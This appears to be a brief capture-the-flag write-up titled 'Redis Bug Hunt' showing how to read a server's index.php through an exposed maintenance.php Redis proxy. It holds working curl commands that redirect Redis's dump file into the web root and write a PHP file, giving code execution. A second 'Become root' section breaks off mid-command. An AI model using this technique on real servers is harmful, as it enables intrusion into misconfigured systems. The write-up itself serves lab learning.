# Redis Bug Hunt
Location: Kitchen

The objective is to retrieve the index.php file from the server.

## Approach 1: Pushing a PHP file into the Web Tree
This can be done using these commands:
```
curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
curl http://localhost/maintenance.php?cmd=config,set,dbfilename,m.php
curl 'http://localhost/maintenance.php?cmd=set,test,<?php%20echo%20file_get_contents("index.php");%20?>'
curl http://localhost/maintenance.php?cmd=save
curl http://localhost/m.php --output -
```

## Approach 2: Become root
```
echo "\n\n
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTY1MjQ5MjI2NiwyODg2OTcwMTksNDc4OT
U5MjY3LDczMDk5ODExNl19
-->